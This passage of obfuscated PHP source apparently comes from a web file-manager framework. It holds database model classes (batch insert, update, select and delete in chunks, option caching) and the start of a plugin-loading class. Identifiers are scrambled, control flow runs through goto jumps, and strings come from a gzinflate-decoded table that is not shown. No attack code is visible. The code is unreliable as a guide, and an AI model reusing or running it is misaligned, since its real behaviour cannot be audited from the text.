eò³Üæ…æ: $B«åëÑ®® = array_to_keyvalue($B«åëÑ®®, $a¬ÆàÌ¸[88], $a¬ÆàÌ¸[348]); return $B«åëÑ®®; goto bÙ†à‡¼‹é; Fİ×ì›¼¡: $b”ĞËß®ÒÆ = Model($this->tableMeta[$a¬ÆàÌ¸[347]]); $b¹œ¶ÄŠù¯ = array($BĞĞŞƒÖù => $FŒ¥ŞÕÇç¯); $B«åëÑ®® = $b”ĞËß®ÒÆ->field($a¬ÆàÌ¸[351])->where($b¹œ¶ÄŠù¯)->select(); goto eò³Üæ…æ; e«ì¾¹Ú÷: $a¬ÆàÌ¸ =& $_SERVER[ÍÓÖ€°å]; if (!$this->tableMeta) { return array(); } $BĞĞŞƒÖù = $this->tableMeta[$a¬ÆàÌ¸[346]]; goto Fİ×ì›¼¡; bÙ†à‡¼‹é: } private function checkDataAutoHas($BºìÆ”âäÂ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Eƒ‹ˆ´÷) { if (in_array($BºìÆ”âäÂ, explode($_SERVER[ÍÓÖ€°å][47], $Eƒ‹ˆ´÷[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$A”šæ–Í¾, $Dò ğ¬”‹š) { $e—îÉ¹šç =& $_SERVER[ÍÓÖ€°å]; foreach ($this->dataAuto as $b›˜ùàÇÙÈ) { $f¾Šªœ…Ò“ = $b›˜ùàÇÙÈ[0]; if (!in_array($Dò ğ¬”‹š, explode($e—îÉ¹šç[47], $b›˜ùàÇÙÈ[2]))) { continue; } switch (trim($b›˜ùàÇÙÈ[3])) { case $e—îÉ¹šç[301]: case $e—îÉ¹šç[302]: $EòÉÄ º¨´ = $b›˜ùàÇÙÈ[1]; $aŒ©±àÌ× = isset($b›˜ùàÇÙÈ[4]) ? (array) $b›˜ùàÇÙÈ[4] : array(); if ($EòÉÄ º¨´ == $e—îÉ¹šç[178] && array_key_exists($f¾Šªœ…Ò“, $A”šæ–Í¾)) { if (!$A”šæ–Í¾[$f¾Šªœ…Ò“]) { unset($A”šæ–Í¾[$f¾Šªœ…Ò“]); } break; } if (isset($A”šæ–Í¾[$f¾Šªœ…Ò“])) { array_unshift($aŒ©±àÌ×, $A”šæ–Í¾[$f¾Šªœ…Ò“]); } if ($e—îÉ¹šç[301] == $b›˜ùàÇÙÈ[3]) { $A”šæ–Í¾[$f¾Šªœ…Ò“] = call_user_func_array($EòÉÄ º¨´, $aŒ©±àÌ×); } else { $A”šæ–Í¾[$f¾Šªœ…Ò“] = call_user_func_array(array(&$this, $EòÉÄ º¨´), $aŒ©±àÌ×); } break; case $e—îÉ¹šç[253]: $A”šæ–Í¾[$f¾Šªœ…Ò“] = $A”šæ–Í¾[$b›˜ùàÇÙÈ[1]]; break; case $e—îÉ¹šç[274]: if (isset($A”šæ–Í¾[$f¾Šªœ…Ò“]) && !is_string($A”šæ–Í¾[$f¾Šªœ…Ò“])) { $A”šæ–Í¾[$f¾Šªœ…Ò“] = json_encode_force($A”šæ–Í¾[$f¾Šªœ…Ò“]); } break; case $e—îÉ¹šç[303]: if ($A”šæ–Í¾[$f¾Šªœ…Ò“] === $e—îÉ¹šç[33]) { unset($A”šæ–Í¾[$f¾Šªœ…Ò“]); } break; case $e—îÉ¹šç[304]: $A”šæ–Í¾[$f¾Šªœ…Ò“] = $b›˜ùàÇÙÈ[1]; default: break; } } if ($Dò ğ¬”‹š == $e—îÉ¹šç[335]) { $Fª×’×ñİ = strtolower($this->db->getDbType()); if (strpos($Fª×’×ñİ, $e—îÉ¹šç[9]) !== 0) { return; } $A‘Ÿù¯Ñ¹ç = $this->field(!0)->fields; $aœ¬Á§Ñ† = $A‘Ÿù¯Ñ¹ç[$e—îÉ¹šç[232]]; if (isset($A‘Ÿù¯Ñ¹ç[$e—îÉ¹šç[231]])) { unset($aœ¬Á§Ñ†[$A‘Ÿù¯Ñ¹ç[$e—îÉ¹šç[231]]]); } foreach ($aœ¬Á§Ñ† as $CÖàÙóÆ¾ => $Dò ğ¬”‹š) { if (!isset($A”šæ–Í¾[$CÖàÙóÆ¾])) { $A”šæ–Í¾[$CÖàÙóÆ¾] = $e—îÉ¹šç[33]; } } } } private function dataAfterFilter(&$B–´¾¿©†¤) { $f÷ÏãŸ¹¥‰ =& $_SERVER[ÍÓÖ€°å]; foreach ($this->dataAuto as $b…‰ïò×ÈÁ) { $eôÙ‘­í×ã = $b…‰ïò×ÈÁ[0]; if (!in_array($f÷ÏãŸ¹¥‰[337], explode($f÷ÏãŸ¹¥‰[47], $b…‰ïò×ÈÁ[2]))) { continue; } if (!isset($B–´¾¿©†¤[$eôÙ‘­í×ã])) { continue; } switch (trim($b…‰ïò×ÈÁ[3])) { case $f÷ÏãŸ¹¥‰[301]: case $f÷ÏãŸ¹¥‰[302]: $EŠ°‰ãˆÉ‹ = isset($b…‰ïò×ÈÁ[4]) ? (array) $b…‰ïò×ÈÁ[4] : array(); array_unshift($EŠ°‰ãˆÉ‹, $B–´¾¿©†¤[$eôÙ‘­í×ã]); if ($f÷ÏãŸ¹¥‰[301] == $b…‰ïò×ÈÁ[3]) { $B–´¾¿©†¤[$eôÙ‘­í×ã] = call_user_func_array($b…‰ïò×ÈÁ[1], $EŠ°‰ãˆÉ‹); } else { $B–´¾¿©†¤[$eôÙ‘­í×ã] = call_user_func_array(array(&$this, $b…‰ïò×ÈÁ[1]), $EŠ°‰ãˆÉ‹); } break; case $f÷ÏãŸ¹¥‰[253]: $B–´¾¿©†¤[$eôÙ‘­í×ã] = $B–´¾¿©†¤[$b…‰ïò×ÈÁ[1]]; break; case $f÷ÏãŸ¹¥‰[274]: $a£™‘ˆƒøœ = $B–´¾¿©†¤[$eôÙ‘­í×ã]; $B–´¾¿©†¤[$eôÙ‘­í×ã] = json_decode($a£™‘ˆƒøœ, !0); if (is_null($B–´¾¿©†¤[$eôÙ‘­í×ã])) { $B–´¾¿©†¤[$eôÙ‘­í×ã] = $a£™‘ˆƒøœ; } break; case $f÷ÏãŸ¹¥‰[303]: if ($B–´¾¿©†¤[$eôÙ‘­í×ã] === $f÷ÏãŸ¹¥‰[33]) { unset($B–´¾¿©†¤[$eôÙ‘­í×ã]); } break; case $f÷ÏãŸ¹¥‰[304]: $B–´¾¿©†¤[$eôÙ‘­í×ã] = $b…‰ïò×ÈÁ[1]; default: break; } } } public function saveAll($eêˆöšÃÌ) { goto fƒ­Öë‰; CŞÜÂÑĞ»½: $bµ‹¶÷©¥ = count($eêˆöšÃÌ); for ($fÆÁ¢“ŒÜ = 0; $fÆÁ¢“ŒÜ < $bµ‹¶÷©¥; $fÆÁ¢“ŒÜ++) { $C®îò½ÁºÎ = $eêˆöšÃÌ[$fÆÁ¢“ŒÜ]; if (!is_array($C®îò½ÁºÎ) || count($C®îò½ÁºÎ) != 4) { continue; } $fÁñù¹†®¶ = "\x55\120\104\101\124\105\x20{$E²Âõ©î­ì}\40\123\105\124\40{$C®îò½ÁºÎ[2]}\x20\x3d\x20\x43\101\x53\x45\x20{$C®îò½ÁºÎ[0]}\40\12"; if ($B¡Ò”âŞˆÂ == 0) { $fÜŞ›ÊÔ³ = $fÁñù¹†®¶; } $CÊôİÏªàç[] = $bµ¢§¨‰ØÍ[102] . $C®îò½ÁºÎ[1] . $bµ¢§¨‰ØÍ[102]; $B¡Ò”âŞˆÂ++; $fÜŞ›ÊÔ³ .= "\40\x57\110\x45\x4e\x20\47{$C®îò½ÁºÎ[1]}\x27\40\124\110\105\x4e\x20\x27{$C®îò½ÁºÎ[3]}\x27\40\12"; if ($B¡Ò”âŞˆÂ == $cÑ´—¶ || $fÆÁ¢“ŒÜ == $bµ‹¶÷©¥ - 1) { $bÂÉˆÀËÌõ = implode($bµ¢§¨‰ØÍ[47], $CÊôİÏªàç); $fÜŞ›ÊÔ³ .= "\40\x45\x4e\x44\40\40\127\110\105\122\105\40{$C®îò½ÁºÎ[0]}\40\x49\x4e\40\50{$bÂÉˆÀËÌõ}\51\40"; $this->execute($fÜŞ›ÊÔ³); $B¡Ò”âŞˆÂ = 0; $fÜŞ›ÊÔ³ = $fÁñù¹†®¶; $CÊôİÏªàç = array(); } } goto F½İÎ³‚Êˆ; fƒ­Öë‰: $bµ¢§¨‰ØÍ =& $_SERVER[ÍÓÖ€°å]; $E²Âõ©î­ì = $this->tablePrefix . $this->tableName; $cÑ´—¶ = self::SQL_WHERE_IN_CHUNK; goto a³î²µ®ÆÚ; a³î²µ®ÆÚ: $fÜŞ›ÊÔ³ = $bµ¢§¨‰ØÍ[352]; $B¡Ò”âŞˆÂ = 0; $CÊôİÏªàç = array(); goto CŞÜÂÑĞ»½; F½İÎ³‚Êˆ: } public function saveAllEach($båÎ—æÇŒ…) { $dğÖ©æÂ’‡ =& $_SERVER[ÍÓÖ€°å]; $AÚ¥‡Ã‰œË = $this->tablePrefix . $this->tableName; foreach ($båÎ—æÇŒ… as $AÌì¤ğÄ¥) { if (!is_array($AÌì¤ğÄ¥) || count($AÌì¤ğÄ¥) != 4) { continue; } $D³ÇÙ¼Âòé = $AÌì¤ğÄ¥[0] . $dğÖ©æÂ’‡[353] . $AÌì¤ğÄ¥[1] . $dğÖ©æÂ’‡[102]; $bùàí‘ÎğÖ = $AÌì¤ğÄ¥[2] . $dğÖ©æÂ’‡[353] . $AÌì¤ğÄ¥[3] . $dğÖ©æÂ’‡[102]; $eŠ„¿ªÊ´ = "\165\160\x64\x61\164\145\x20{$AÚ¥‡Ã‰œË}\x20\x73\x65\164\x20{$bùàí‘ÎğÖ}\40\x77\x68\145\x72\145\x20{$D³ÇÙ¼Âòé}\73"; $this->execute($eŠ„¿ªÊ´); } } public function addAll($D×ˆ¦®İÃÍ, $b¼Á¿—êâµ = array(), $aÆĞ‚®³Å = false) { goto BØé®¬Öæ­; BØé®¬Öæ­: $AÃò…ãé· =& $_SERVER[ÍÓÖ€°å]; ignore_timeout(); $eä¤Œ´¹šè = self::SQL_WHERE_IN_CHUNK; goto bİõ—Ì³½¸; AÜ¾§îù™º: if (method_exists($this->db, $AÃò…ãé·[252])) { for ($fíË†ÙÜ„¦ = 0; $fíË†ÙÜ„¦ < count($D×ˆ¦®İÃÍ); $fíË†ÙÜ„¦ += $eä¤Œ´¹šè) { $D˜‰„¾’ğ« = array_slice($D×ˆ¦®İÃÍ, $fíË†ÙÜ„¦, $eä¤Œ´¹šè); if (!is_array($D˜‰„¾’ğ«) || count($D˜‰„¾’ğ«) == 0) { break; } $fîÆîœ•Ñ = $this->db->insertAll($D˜‰„¾’ğ«, $b¼Á¿—êâµ, $aÆĞ‚®³Å); } } else { $this->startTrans(); foreach ($D×ˆ¦®İÃÍ as $A¸¯ËÔÁŠ => $A¤É‚¿–Ù) { $fîÆîœ•Ñ = $this->db->insert($A¤É‚¿–Ù, $b¼Á¿—êâµ, $aÆĞ‚®³Å); } $this->commit(); } if (!1 !== $fîÆîœ•Ñ) { $dƒÈèö©± = $this->getLastInsID(); if ($dƒÈèö©±) { return $dƒÈèö©±; } } return $fîÆîœ•Ñ; goto fÇ†±ò„¢; bİõ—Ì³½¸: if (empty($D×ˆ¦®İÃÍ)) { $this->error = think_lang($AÃò…ãé·[251]); return !1; } $b¼Á¿—êâµ = $this->_parseOptions($b¼Á¿—êâµ); foreach ($D×ˆ¦®İÃÍ as $A¸¯ËÔÁŠ => $A¤É‚¿–Ù) { $D×ˆ¦®İÃÍ[$A¸¯ËÔÁŠ] = $this->_facade($A¤É‚¿–Ù); $this->_beforeInsert($D×ˆ¦®İÃÍ[$A¸¯ËÔÁŠ], $b¼Á¿—êâµ); } goto AÜ¾§îù™º; fÇ†±ò„¢: } public function save($F§ÍÙ³ïõÖ = '', $Dİ”­†»Äó = array()) { goto Eˆáøö‚Ë°; B‘­¬Áä: $AƒÅ”¾—“ = $BƒáòƒˆŒ¢[$eŒ¥öí¥¸[255]][$aĞµÓò¤Õó][1]; $e”ÇÇåÍµº = count($AƒÅ”¾—“); for ($f¦‡´¼ÖËÃ = 0; $f¦‡´¼ÖËÃ < $e”ÇÇåÍµº; $f¦‡´¼ÖËÃ += $A‹²»ŒØ¹È) { $b¶ÇÓ Ûø– = array_slice($AƒÅ”¾—“, $f¦‡´¼ÖËÃ, $A‹²»ŒØ¹È); if (!is_array($b¶ÇÓ Ûø–) || count($b¶ÇÓ Ûø–) == 0) { break; } $BƒáòƒˆŒ¢[$eŒ¥öí¥¸[255]][$aĞµÓò¤Õó][1] = $b¶ÇÓ Ûø–; $this->optionsValue($BƒáòƒˆŒ¢); $BƒÆßæÈå += parent::save($F§ÍÙ³ïõÖ, $Dİ”­†»Äó); } goto eöÖØÍéøì; Eˆáøö‚Ë°: $eŒ¥öí¥¸ =& $_SERVER[ÍÓÖ€°å]; $A‹²»ŒØ¹È = self::SQL_WHERE_IN_CHUNK; $BƒáòƒˆŒ¢ = $this->optionsValue(); goto eÌåà£ôª; eöÖØÍéøì: return $BƒÆßæÈå; goto dƒ÷Ú¯ÀÅë; eÌåà£ôª: $aĞµÓò¤Õó = $this->findWhereField($BƒáòƒˆŒ¢); if (!$aĞµÓò¤Õó) { return parent::save($F§ÍÙ³ïõÖ, $Dİ”­†»Äó); } $BƒÆßæÈå = 0; goto B‘­¬Áä; dƒ÷Ú¯ÀÅë: } public function add($Fƒê¤µÀÅŠ = '', $F¬»ø–ÕƒÊ = array(), $dÁ‡İ’â³ë = false) { if ($this->addTaskStatus && is_array($Fƒê¤µÀÅŠ)) { $this->addTaskData[] = $Fƒê¤µÀÅŠ; return; } return parent::add($Fƒê¤µÀÅŠ, $F¬»ø–ÕƒÊ, $dÁ‡İ’â³ë); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($dØ¾†ª‘ëÅ = array()) { goto C˜Ã©–šƒØ; DÚ¼ÎÍß÷: $C¬®¢†È¿ = null; for ($e›ĞËëÇ = 0; $e›ĞËëÇ < count($CÙ–ˆÀ–¯á); $e›ĞËëÇ += $fÈ£­½›º) { $e¬»«ÚôİÕ = array_slice($CÙ–ˆÀ–¯á, $e›ĞËëÇ, $fÈ£­½›º); if (!is_array($e¬»«ÚôİÕ) || count($e¬»«ÚôİÕ) == 0) { break; } $bæ†Á•„—²[$fŒ¡ ëôğ[255]][$B³ºš²™Ë][1] = $e¬»«ÚôİÕ; $this->optionsValue($bæ†Á•„—²); $f˜‚Õ¹‚ó = parent::select($dØ¾†ª‘ëÅ); if (!$f˜‚Õ¹‚ó) { continue; } if (is_null($C¬®¢†È¿)) { $C¬®¢†È¿ = array(); } $C¬®¢†È¿ = array_merge($C¬®¢†È¿, $f˜‚Õ¹‚ó); } return $C¬®¢†È¿; goto d‡Òä—µË˜; C˜Ã©–šƒØ: $fŒ¡ ëôğ =& $_SERVER[ÍÓÖ€°å]; $fÈ£­½›º = self::SQL_WHERE_IN_CHUNK; $bæ†Á•„—² = $this->optionsValue(); goto d¦Ê©éíÏî; d¦Ê©éíÏî: $B³ºš²™Ë = $this->findWhereField($bæ†Á•„—²); if (!$B³ºš²™Ë || isset($bæ†Á•„—²[$fŒ¡ ëôğ[272]]) || isset($bæ†Á•„—²[$fŒ¡ ëôğ[331]])) { return parent::select($dØ¾†ª‘ëÅ); } $CÙ–ˆÀ–¯á = $bæ†Á•„—²[$fŒ¡ ëôğ[255]][$B³ºš²™Ë][1]; goto DÚ¼ÎÍß÷; d‡Òä—µË˜: } public function delete($CÛ”‚òöÃ = array()) { goto CŞñ¶Ù¥‚î; eÍµº¯¨®Ó: $eÉ©­ªÓĞô = $this->findWhereField($A†‰õˆƒÑ); if (!$eÉ©­ªÓĞô) { return parent::delete($CÛ”‚òöÃ); } $Dì¢ŸîÇÙŞ = 0; goto FÈ¬ ¬¥¯‡; CŞñ¶Ù¥‚î: $c½­·Í÷Ş =& $_SERVER[ÍÓÖ€°å]; $eç²ÔÜ¡‘ = self::SQL_WHERE_IN_CHUNK; $A†‰õˆƒÑ = $this->optionsValue(); goto eÍµº¯¨®Ó; FÈ¬ ¬¥¯‡: $DºªìÎí†º = $A†‰õˆƒÑ[$c½­·Í÷Ş[255]][$eÉ©­ªÓĞô][1]; for ($D…”î—²Ö = 0; $D…”î—²Ö < count($DºªìÎí†º); $D…”î—²Ö += $eç²ÔÜ¡‘) { $F¤‚¾¨Î±¯ = array_slice($DºªìÎí†º, $D…”î—²Ö, $eç²ÔÜ¡‘); if (!is_array($F¤‚¾¨Î±¯) || count($F¤‚¾¨Î±¯) == 0) { break; } $A†‰õˆƒÑ[$c½­·Í÷Ş[255]][$eÉ©­ªÓĞô][1] = $F¤‚¾¨Î±¯; $this->optionsValue($A†‰õˆƒÑ); $Dì¢ŸîÇÙŞ += parent::delete($CÛ”‚òöÃ); } return $Dì¢ŸîÇÙŞ; goto C‚Éİäé½; C‚Éİäé½: } private function findWhereField($DŸµÕİÔ²Š) { $fïÚíœ½° =& $_SERVER[ÍÓÖ€°å]; $B‚ÀŠùŠ¼ = self::SQL_WHERE_IN_CHUNK; if (!is_array($DŸµÕİÔ²Š) || !is_array($DŸµÕİÔ²Š[$fïÚíœ½°[255]])) { return !1; } foreach ($DŸµÕİÔ²Š[$fïÚíœ½°[255]] as $C“œ®ØëÈÀ => $A„Áİ‘ä†µ) { if (is_array($A„Áİ‘ä†µ) && isset($A„Áİ‘ä†µ[0]) && is_string($A„Áİ‘ä†µ[0]) && strtolower($A„Áİ‘ä†µ[0]) == $fïÚíœ½°[7] && is_array($A„Áİ‘ä†µ[1]) && count($A„Áİ‘ä†µ[1]) > $B‚ÀŠùŠ¼) { ignore_timeout(); return $C“œ®ØëÈÀ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\x65\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($e‡£Ø¼‚Ï = false, $a†•›¤ÚÔŠ = "\x6d\157\144\151\x66\171\124\151\x6d\x65", $bíŒÄ„ñ¸ = false) { $a‹ÁÔà‚Š = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$e‡£Ø¼‚Ï) { $a‹ÁÔà‚Š = array_filter(array_values($a‹ÁÔà‚Š)); return array_sort_by($a‹ÁÔà‚Š, $a†•›¤ÚÔŠ, $bíŒÄ„ñ¸); } return $a‹ÁÔà‚Š[$_SERVER[ÍÓÖ€°å][354] . $e‡£Ø¼‚Ï]; } public function insert($eå‰ˆº™Æ) { goto bŒ˜¯­ëÔ¥; C°“ŸŠŒ¹Ó: return $CÅ¥ŸŠÈƒ; goto Fï´æ…›à; E‚±“»ÔÎõ: $eå‰ˆº™Æ[$bó‹„è²¿›[101]] = time(); Model($this->modelType)->set($bó‹„è²¿›[355], $CÅ¥ŸŠÈƒ, $this->optionType . $bó‹„è²¿›[356]); Model($this->modelType)->set($bó‹„è²¿›[354] . $CÅ¥ŸŠÈƒ, $eå‰ˆº™Æ, $this->optionType); goto C°“ŸŠŒ¹Ó; Câ¸Ÿó†ğ: $CÅ¥ŸŠÈƒ = $CÅ¥ŸŠÈƒ ? $CÅ¥ŸŠÈƒ : 0; $eå‰ˆº™Æ[$bó‹„è²¿›[357]] = ++$CÅ¥ŸŠÈƒ; $eå‰ˆº™Æ[$bó‹„è²¿›[175]] = time(); goto E‚±“»ÔÎõ; bŒ˜¯­ëÔ¥: $bó‹„è²¿› =& $_SERVER[ÍÓÖ€°å]; $eå‰ˆº™Æ = array_field_key($eå‰ˆº™Æ, $this->field); $CÅ¥ŸŠÈƒ = Model($this->modelType)->get($bó‹„è²¿›[355], $this->optionType . $bó‹„è²¿›[356]); goto Câ¸Ÿó†ğ; Fï´æ…›à: } public function update($D’“ñóí‚Ü, $fÎœ¸Ïê²“) { goto Dƒˆ¯¡Ã¬®; bŞ¾±ß‘Š: return Model($this->modelType)->set($dµ¬Ûší¾ã[354] . $D’“ñóí‚Ü, $fÎœ¸Ïê²“, $this->optionType); goto dá©Éƒäñ”; Dƒˆ¯¡Ã¬®: $dµ¬Ûší¾ã =& $_SERVER[ÍÓÖ€°å]; $fÎœ¸Ïê²“ = array_field_key($fÎœ¸Ïê²“, $this->field); $f»¸””ºšã = $this->listData($D’“ñóí‚Ü); goto FÂ„“’¬•â; FÂ„“’¬•â: if (!$f»¸””ºšã) { return !1; } $fÎœ¸Ïê²“ = array_merge($f»¸””ºšã, $fÎœ¸Ïê²“); $fÎœ¸Ïê²“[$dµ¬Ûší¾ã[101]] = time(); goto bŞ¾±ß‘Š; dá©Éƒäñ”: } public function remove($cĞğ…‡ß£) { return Model($this->modelType)->remove($_SERVER[ÍÓÖ€°å][354] . $cĞğ…‡ß£, $this->optionType); } public function clear() { $dÇ²õœêÔÙ =& $_SERVER[ÍÓÖ€°å]; Model($this->modelType)->remove($dÇ²õœêÔÙ[355], $this->optionType . $dÇ²õœêÔÙ[356]); return Model($this->modelType)->remove(null, $this->optionType); } public function findByKey($C’ÆÂè‚ƒ , $eáÆ¡¾À—) { if (!$eáÆ¡¾À—) { return !1; } $B¤‹ Ÿ†í· = $this->listData(); $B¤‹ Ÿ†í· = array_to_keyvalue($B¤‹ Ÿ†í·, $C’ÆÂè‚ƒ ); return isset($B¤‹ Ÿ†í·[$eáÆ¡¾À—]) ? $B¤‹ Ÿ†í·[$eáÆ¡¾À—] : !1; } public function findByName($CÊ…÷¤»°•) { return $this->findByKey($_SERVER[ÍÓÖ€°å][28], $CÊ…÷¤»°•); } protected function resetData($a‚ÃééŠõ) { $e¬Ñ¹†ãÌ =& $_SERVER[ÍÓÖ€°å]; $Eöğ‡Û§œ‚ = array(); for ($aîêÑœ›Ø = 0; $aîêÑœ›Ø < count($a‚ÃééŠõ); $aîêÑœ›Ø++) { $Eöğ‡Û§œ‚[$e¬Ñ¹†ãÌ[354] . $a‚ÃééŠõ[$aîêÑœ›Ø][$e¬Ñ¹†ãÌ[357]]] = $a‚ÃééŠõ[$aîêÑœ›Ø]; } return Model($this->modelType)->set($Eöğ‡Û§œ‚, !1, $this->optionType); } private function getAutoName($AËÃí•ªªô) { $c¹ÙÈ™Íâ¨ = array_to_keyvalue(parent::listData(), $_SERVER[ÍÓÖ€°å][28]); if (!$c¹ÙÈ™Íâ¨ || !isset($c¹ÙÈ™Íâ¨[$AËÃí•ªªô])) { return $AËÃí•ªªô; } for ($b­Ş‘¥øÔ» = 1; $b­Ş‘¥øÔ» < count($c¹ÙÈ™Íâ¨); $b­Ş‘¥øÔ»++) { $B¥Çö£ = $AËÃí•ªªô . "\50{$b­Ş‘¥øÔ»}\51"; if (!isset($c¹ÙÈ™Íâ¨[$B¥Çö£])) { return $B¥Çö£; } } return $B¥Çö£; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($fåğğ”†˜Ù = false, $B§¤¬ë‰¤ = '', $bçÕ‰¹é…× = false) { goto FÇï¡õ¤Ãè; CŠ´¿Àâ: foreach ($d±ÍäÍ¾¾÷ as $e¥¸ƒ¯–¶ => $eÉáñÌ„ç›) { if ($bçÕ‰¹é…× || in_array($e¥¸ƒ¯–¶, $this->jsonField)) { $d±ÍäÍ¾¾÷[$e¥¸ƒ¯–¶] = json_decode($d±ÍäÍ¾¾÷[$e¥¸ƒ¯–¶], !0); } } $this->cacheAction($A³ˆ£ÀÃƒí[358], $B§¤¬ë‰¤, $d±ÍäÍ¾¾÷); return $fåğğ”†˜Ù ? $d±ÍäÍ¾¾÷[$fåğğ”†˜Ù] : $d±ÍäÍ¾¾÷; goto aÆ§ÖšØÊ; D¡¢Ÿ²¬×‡: $cŞ’‚ä÷¤Ú = $this->filterWhere(array($A³ˆ£ÀÃƒí[29] => $B§¤¬ë‰¤)); $d±ÍäÍ¾¾÷ = $this->where($cŞ’‚ä÷¤Ú)->select(); $d±ÍäÍ¾¾÷ = array_to_keyvalue($d±ÍäÍ¾¾÷, $A³ˆ£ÀÃƒí[88], $A³ˆ£ÀÃƒí[348]); goto CŠ´¿Àâ; FÇï¡õ¤Ãè: $A³ˆ£ÀÃƒí =& $_SERVER[ÍÓÖ€°å]; $d±ÍäÍ¾¾÷ = $this->cacheAction($A³ˆ£ÀÃƒí[168], $B§¤¬ë‰¤); if (is_array($d±ÍäÍ¾¾÷)) { return $fåğğ”†˜Ù ? $d±ÍäÍ¾¾÷[$fåğğ”†˜Ù] : $d±ÍäÍ¾¾÷; } goto D¡¢Ÿ²¬×‡; aÆ§ÖšØÊ: } public function set($e¢™ãá½áÙ, $E®ÏÔôÔ¶‰ = false, $D¤”ÍÔŞõÛ = '') { $F‰Ó¡ˆÃ =& $_SERVER[ÍÓÖ€°å]; $this->cacheAction($F‰Ó¡ˆÃ[359], $D¤”ÍÔŞõÛ); $CâÊ¡Ô‡×ä = array(); $eİè½„ò = is_array($e¢™ãá½áÙ) ? $e¢™ãá½áÙ : array($e¢™ãá½áÙ => $E®ÏÔôÔ¶‰); foreach ($eİè½„ò as $e¢™ãá½áÙ => $e¬¹êÒÓÖ©) { if (is_array($e¬¹êÒÓÖ©)) { $e¬¹êÒÓÖ© = json_encode_force($e¬¹êÒÓÖ©); } $e¬¹êÒÓÖ© = self::textEncode($e¬¹êÒÓÖ©); $eİè½„ò = array($F‰Ó¡ˆÃ[29] => $D¤”ÍÔŞõÛ, $F‰Ó¡ˆÃ[88] => $e¢™ãá½áÙ, $F‰Ó¡ˆÃ[348] => $e¬¹êÒÓÖ©); $CâÊ¡Ô‡×ä[] = $this->filterWhere($eİè½„ò); } return $this->addAll($CâÊ¡Ô‡×ä, array(), !0); } public function setDeep($E¶˜¨Øœ¯, $EÆ¯âµ—Œ = false, $EéÇ’®ÔãÓ = '') { $Dº‘Şôº± = explode($_SERVER[ÍÓÖ€°å][90], $E¶˜¨Øœ¯); $eÔÇã·Ş¯ = $this->get(); array_set_value($eÔÇã·Ş¯, $E¶˜¨Øœ¯, $EÆ¯âµ—Œ); $this->set($Dº‘Şôº±[0], $eÔÇã·Ş¯[$Dº‘Şôº±[0]], $EéÇ’®ÔãÓ); } public function remove($eÜ‰ŸÏñÑ¼, $BøÜ²±ÉÕÜ = '') { $c‘±ÙòÀç =& $_SERVER[ÍÓÖ€°å]; $this->cacheAction($c‘±ÙòÀç[359], $BøÜ²±ÉÕÜ); $b¼”¶¨Û“ = $this->filterWhere(array($c‘±ÙòÀç[88] => $eÜ‰ŸÏñÑ¼, $c‘±ÙòÀç[29] => $BøÜ²±ÉÕÜ)); if (is_null($eÜ‰ŸÏñÑ¼)) { unset($b¼”¶¨Û“[$c‘±ÙòÀç[88]]); } return $this->where($b¼”¶¨Û“)->delete(); } public function cacheAction($FĞïê…Û³å, $AŠõŒ„‰’, $C×º“Í®ÙÜ = false) { $FÈ‹¾¥Å¹× =& $_SERVER[ÍÓÖ€°å]; $B‰¾õÉº™… = $this->cacheKey($AŠõŒ„‰’); switch ($FĞïê…Û³å) { case $FÈ‹¾¥Å¹×[168]: $b“ï²”äÙ­ = Cache::get($B‰¾õÉº™…); break; case $FÈ‹¾¥Å¹×[358]: $b“ï²”äÙ­ = Cache::set($B‰¾õÉº™…, $C×º“Í®ÙÜ); break; case $FÈ‹¾¥Å¹×[359]: $b“ï²”äÙ­ = Cache::remove($B‰¾õÉº™…); break; } return $b“ï²”äÙ­; } protected function filterWhere($EÏ‡ğËçè) { return $EÏ‡ğËçè; } protected function cacheKey($Dº¶‹“‹¥µ) { return $Dº¶‹“‹¥µ; } } goto C™¤ññƒ„ö; Fã®›ÚÓä: define($_SERVER[ÍÓÖ€°å][1619], $_SERVER[ÍÓÖ€°å][1620]); $_SERVER[¬Ö°ı¶Â¯€æ] = explode($_SERVER[ÍÓÖ€°å][1621], gzinflate(substr($_SERVER[ÍÓÖ€°å][1622], 10, -8))); class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x70\154\165\x67\151\156\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\163\164\x61\x74\165\x73", "\162\145\x67\x69\x65\163\164", "\x63\157\156\146\x69\147"); private $versionData = array(); private $version = "\x41"; public function loadList($f…±¼ç·İµ = false) { $c¯õğ¸ó¸Ä = array_to_keyvalue($this->listData(), $_SERVER[¬Ö°ı¶Â¯€æ][0]); if ($f…±¼ç·İµ) { return $c¯õğ¸ó¸Ä[$f…±¼ç·İµ]; } return $c¯õğ¸ó¸Ä; } public function init() { goto d·¢…à¿õ; eÙ¿Ì±£Ö: Hook::bind($eë°ØİŠ[16], $eë°ØİŠ[17]); goto C‘°İÇ££·; Eêƒé‹õ: Hook::trigger($eë°ØİŠ[2]); Hook::trigger(ACTION); $dØ¶áíÂ…æ = array($eë°ØİŠ[3], $eë°ØİŠ[4]); goto CæÆÅ¨”Æ; Eè…ñ²Ñê: $this->dataAllow(); $f¸‹÷ Ãˆ¨ = $this->checkPlugin($f¸‹÷ Ãˆ¨); foreach ($f¸‹÷ Ãˆ¨ as $eˆ…Î„èäÀ => $Aå×á½ã¢) { $Eª·°âùÛ‡ = $this->appAllow($eˆ…Î„èäÀ, $Aå×á½ã¢); if (!$Eª·°âùÛ‡) { continue; } foreach ($Aå×á½ã¢[$eë°ØİŠ[1]] as $A¦ƒ’Øõ‰ß => $a¤ïÁ¢¼®) { Hook::bind($A¦ƒ’Øõ‰ß, $a¤ïÁ¢¼®); } } goto Eêƒé‹õ; d·¢…à¿õ: $eë°ØİŠ =& $_SERVER[¬Ö°ı¶Â¯€æ]; $f¸‹÷ Ãˆ¨ = $this->loadList(); $this->dataCheck(); goto Eè…ñ²Ñê; E¶Öƒ±ğ¸: $this->assignCopyright(); 